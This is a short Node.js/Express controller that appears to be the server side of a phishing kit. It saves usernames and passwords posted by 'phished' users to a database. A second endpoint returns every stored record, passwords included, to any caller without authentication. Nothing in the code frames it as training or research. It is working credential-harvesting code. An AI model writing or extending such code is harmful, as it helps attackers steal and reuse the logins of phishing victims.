let PhishedUser = require('../models/phishedUserModel.js')
let _ = require('lodash');

module.exports = {
    createUser: async (req, res) => {
        let phishedUser = PhishedUser.build(req.body);

        if (!phishedUser.getDataValue('username') || !phishedUser.getDataValue('password')) {
            res.status(400).send({ status: false, message: "please provide all required fields" })
        }
        else {
            phishedUser.save().then((user) => {
                res.json({ status: true, message: "user added successfully", user: user })
            }).catch((err) => {
                res.json({ status: false, message: "error message", error: err })
            })

        }
    },

    getUsers: async (req, res) => {
        PhishedUser.findAll()
            .then((user) => {
                res.json({ status: true, message: "get user from database", user: user });
            }).catch(err => {
                res.json({ status: false, message: "error getting user from database", err: err });
            });
    }
}



